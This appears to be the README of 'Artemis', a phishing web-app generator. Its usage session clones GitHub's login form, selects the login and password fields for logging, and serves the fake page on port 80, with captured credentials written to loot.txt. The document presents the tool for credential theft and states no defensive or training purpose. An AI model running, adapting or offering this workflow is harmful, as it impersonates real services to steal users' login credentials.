# Artemis
Phishing webapp generator

## Getting started

```
$ pip install -r requirements.txt

$ ./builder.py 'https://github.com/login'
[*] Found forms:
FORM 0 --> /session
Form to log: 0
Selected form 0

[*] Form fields:
0 - utf8
1 - authenticity_token
2 - login
3 - password
4 - commit
Fields to log (space separated): 2 3
Logging: ['login', 'password']

[*] Phishing page ready !
cd app && python app.py runserver to get started

$ cd app/
$ python app.py runserver -h 0.0.0.0 -p 80
```

Gathered credentials are stored in loot.txt.

